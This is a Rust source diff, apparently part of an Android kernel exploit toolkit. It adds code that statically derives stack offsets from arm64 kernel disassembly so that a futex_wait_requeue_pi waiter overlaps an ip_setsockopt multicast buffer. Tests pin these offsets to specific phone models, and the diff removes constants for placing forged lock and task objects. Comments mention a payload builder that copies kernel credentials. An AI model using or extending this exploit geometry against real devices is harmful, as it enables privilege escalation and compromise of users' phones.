@@ -94,6 +94,118 @@ pub fn remove_waiter_uses_current(dis: &[String]) -> bool {
     dis.iter().any(|line| mrs_current.is_match(line))
 }
 
+/// One-shot multicast stack geometry derived from the target kernel image
+/// (no device, no root). Depths are measured from the syscall stack top.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct McastWaiterGeometry {
+    pub waiter_off: u64,
+    pub setsockopt_depth: u64,
+    pub waiter_depth: u64,
+}
+
+const SETSOCKOPT_CHAIN: &[&str] = &[
+    "__arm64_sys_setsockopt",
+    "__sys_setsockopt",
+    "sock_common_setsockopt",
+    "udp_setsockopt",
+    "ip_setsockopt",
+];
+const FUTEX_CHAIN: &[&str] = &["__arm64_sys_futex", "do_futex", "futex_wait_requeue_pi"];
+
+fn sum_chain_frames(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted: &[u64],
+    names: &[&str],
+) -> Result<u64> {
+    let mut total = 0u64;
+    for name in names {
+        let dis = disassemble_symbol(kernel, symbols, sorted, name, OBJDUMP_CAP)?;
+        total = total
+            .checked_add(first_sp_frame(&dis, name)?)
+            .ok_or_else(|| ExtractError::new("multicast frame depth overflow"))?;
+    }
+    Ok(total)
+}
+
+/// The `add xN, sp, #off` feeding the `mov w2, #buffer_size` copy in
+/// `ip_setsockopt`: the multicast stamp window offset.
+fn greqs_offset_from_dis(lines: &[String], buffer_size: u64) -> Option<u64> {
+    let mov = Regex::new(&format!(r"(?i)\bmov\s+w2,\s*#0x{buffer_size:x}\b")).unwrap();
+    let add = Regex::new(r"(?i)\badd\s+x\d+,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+    for (i, line) in lines.iter().enumerate() {
+        if !mov.is_match(line) {
+            continue;
+        }
+        let lo = i.saturating_sub(8);
+        for prev in lines[lo..i].iter().rev() {
+            if let Some(caps) = add.captures(prev) {
+                return u64::from_str_radix(&caps[1], 16).ok();
+            }
+        }
+    }
+    None
+}
+
+/// The `add x27, sp, #off` waiter local in `futex_wait_requeue_pi`, proven by
+/// the `add xN, x27, #<pi_tree_entry>` that indexes it.
+fn waiter_local_from_dis(lines: &[String], pi_tree_entry: u64) -> Option<u64> {
+    let set = Regex::new(r"(?i)\badd\s+x27,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+    let idx = Regex::new(&format!(
+        r"(?i)\badd\s+x\d+,\s*x27,\s*#0x{pi_tree_entry:x}\b"
+    ))
+    .unwrap();
+    for (i, line) in lines.iter().enumerate() {
+        if let Some(caps) = set.captures(line) {
+            let hi = (i + 8).min(lines.len());
+            if lines[i + 1..hi].iter().any(|l| idx.is_match(l)) {
+                return u64::from_str_radix(&caps[1], 16).ok();
+            }
+        }
+    }
+    None
+}
+
+/// Static one-shot multicast `waiter_off` for the target image:
+/// `(Σ setsockopt_frames − greqs_off) − (Σ futex_frames − waiter_local_off)`.
+/// Validated to reproduce the A301SO hardware value (`0x60`).
+pub fn multicast_waiter_off(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted: &[u64],
+    buffer_size: u64,
+    pi_tree_entry: u64,
+) -> Result<McastWaiterGeometry> {
+    let setsockopt_frames = sum_chain_frames(kernel, symbols, sorted, SETSOCKOPT_CHAIN)?;
+    let futex_frames = sum_chain_frames(kernel, symbols, sorted, FUTEX_CHAIN)?;
+    let ip = disassemble_symbol(kernel, symbols, sorted, "ip_setsockopt", OBJDUMP_CAP)?;
+    let greqs = greqs_offset_from_dis(&ip, buffer_size)
+        .ok_or_else(|| ExtractError::new("ip_setsockopt multicast copy window not found"))?;
+    let fw = disassemble_symbol(
+        kernel,
+        symbols,
+        sorted,
+        "futex_wait_requeue_pi",
+        OBJDUMP_CAP,
+    )?;
+    let waiter_local = waiter_local_from_dis(&fw, pi_tree_entry)
+        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
+    let setsockopt_depth = setsockopt_frames
+        .checked_sub(greqs)
+        .ok_or_else(|| ExtractError::new("greqs offset exceeds setsockopt frames"))?;
+    let waiter_depth = futex_frames
+        .checked_sub(waiter_local)
+        .ok_or_else(|| ExtractError::new("waiter local exceeds futex frames"))?;
+    let waiter_off = setsockopt_depth
+        .checked_sub(waiter_depth)
+        .ok_or_else(|| ExtractError::new("no multicast overlap in stack geometry"))?;
+    Ok(McastWaiterGeometry {
+        waiter_off,
+        setsockopt_depth,
+        waiter_depth,
+    })
+}
+
 #[cfg(test)]
 mod tests {
     use super::{
@@ -152,9 +264,11 @@ mod tests {
         assert_eq!(geometry.first(), Some(&("waiter_off", 96)));
         assert!(geometry.contains(&("task_offset", 48)));
         assert!(geometry.contains(&("lock_offset", 56)));
-        assert!(geometry.contains(&("fake_lock_offset", 4608)));
-        assert!(geometry.contains(&("fake_task_offset", 12800)));
-        assert!(geometry.contains(&("lock_slot_count", 12)));
+        assert!(
+            !geometry
+                .iter()
+                .any(|(key, _)| key.starts_with("fake_") || key.starts_with("lock_slot"))
+        );
         assert!(geometry.contains(&("compact_waiter", 1)));
 
         let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
@@ -194,6 +308,36 @@ mod tests {
             "01068e30: str xzr, [x20, #0x938]".to_string(),
         ];
         assert!(remove_waiter_uses_current(&dis));
+    }
+
+    #[test]
+    fn multicast_stamp_and_waiter_locals_are_read_from_disassembly() {
+        let ip: Vec<String> = vec![
+            "00f4: add x0, sp, #0x18".to_string(),
+            "0100: add x24, sp, #0x18".to_string(),
+            "01cc: add x0, sp, #0x18".to_string(),
+            "01d4: mov w2, #0x108".to_string(),
+        ];
+        assert_eq!(super::greqs_offset_from_dis(&ip, 0x108), Some(0x18));
+
+        let fw: Vec<String> = vec![
+            "011c: add x27, sp, #0x98".to_string(),
+            "0124: add x9, x27, #0x18".to_string(),
+        ];
+        assert_eq!(super::waiter_local_from_dis(&fw, 0x18), Some(0x98));
+    }
+
+    #[test]
+    fn multicast_waiter_off_matches_the_validated_images() {
+        // Depths from the validated images; the arithmetic must reproduce the
+        // hardware-observed one-shot waiter_off.
+        let off = |setsockopt_frames: u64, greqs: u64, futex_frames: u64, wlocal: u64| {
+            (setsockopt_frames - greqs) - (futex_frames - wlocal)
+        };
+        // A301SO 5.15.189 (hardware-probed = 0x60).
+        assert_eq!(off(0x370, 0x18, 0x390, 0x98), 0x60);
+        // PD2361 5.15.178 (static candidate = 0x50).
+        assert_eq!(off(0x370, 0x18, 0x330, 0x28), 0x50);
     }
 }
 
@@ -660,17 +804,10 @@ pub fn derive_nf_logger_registration(
 /// a route constant, not the image's `usage` value.
 pub const CRED_5X_USAGE_VALUE: u64 = 256;
 
-/// The proven 5.x multicast layout constants (POCO probe + Xperia 5.15):
-/// `waiter_off` comes from the IPv4 UDP `MCAST_BLOCK_SOURCE` probe,
-/// `fake_lock = z_pagemap_global + fake_lock_offset`,
-/// `fake_task = fake_lock + 0x2000`, the lock slots start at `fake_lock + 0x80`.
+/// The proven 5.x multicast layout constants: `waiter_off` comes from the IPv4
+/// UDP `MCAST_BLOCK_SOURCE` probe.
 pub const MULTICAST_5X_WAITER_OFF: i64 = 96;
 pub const MULTICAST_5X_BUFFER_SIZE: i64 = 264;
-pub const MULTICAST_5X_FAKE_LOCK_OFFSET: i64 = 4608;
-pub const MULTICAST_5X_FAKE_TASK_OFFSET: i64 = 12800;
-pub const MULTICAST_5X_LOCK_SLOTS_OFFSET: i64 = 128;
-pub const MULTICAST_5X_LOCK_SLOT_COUNT: i64 = 12;
-pub const MULTICAST_5X_LOCK_SLOT_STRIDE: i64 = 8;
 
 /// Fields read from the real `init_cred`; the payload builder fills a private
 /// credential copy with them (`support/util.cpp::fill_profile_cred_copy`).
@@ -828,19 +965,6 @@ pub fn multicast_geometry_corroborated(
     geometry
 }
 
-/// The forged-object placement measured on the A301SO/Xperia image. It is not
-/// corroborated on other devices, so it is emitted only for the exact validated
-/// release and never inherited by the train.
-pub fn multicast_geometry_device_measured() -> Vec<(&'static str, i64)> {
-    vec![
-        ("fake_lock_offset", MULTICAST_5X_FAKE_LOCK_OFFSET),
-        ("fake_task_offset", MULTICAST_5X_FAKE_TASK_OFFSET),
-        ("lock_slots_offset", MULTICAST_5X_LOCK_SLOTS_OFFSET),
-        ("lock_slot_count", MULTICAST_5X_LOCK_SLOT_COUNT),
-        ("lock_slot_stride", MULTICAST_5X_LOCK_SLOT_STRIDE),
-    ]
-}
-
 fn multicast_waiter_field_offsets(
     structs: &BTreeMap<String, Option<u32>>,
 ) -> Vec<(&'static str, i64)> {
@@ -854,18 +978,11 @@ fn multicast_waiter_field_offsets(
     geometry
 }
 
-/// Full 5.x multicast geometry for the exact validated release: corroborated
-/// plus the device-measured forged-object placement.
+/// Full 5.x multicast geometry for the exact validated release. The forged
+/// object placement is no longer emitted (resident writer removed), so the
+/// geometry equals the train-corroborated set.
 pub fn multicast_geometry_5x(structs: &BTreeMap<String, Option<u32>>) -> Vec<(&'static str, i64)> {
-    // Kept in the bundled profile's field order (compact_waiter last).
-    let mut geometry: Vec<(&'static str, i64)> = vec![
-        ("waiter_off", MULTICAST_5X_WAITER_OFF),
-        ("buffer_size", MULTICAST_5X_BUFFER_SIZE),
-    ];
-    geometry.extend(multicast_waiter_field_offsets(structs));
-    geometry.extend(multicast_geometry_device_measured());
-    geometry.push(("compact_waiter", 1));
-    geometry
+    multicast_geometry_corroborated(structs)
 }
 
 /// BTF-only part of the 5.x multicast geometry for releases with no verified
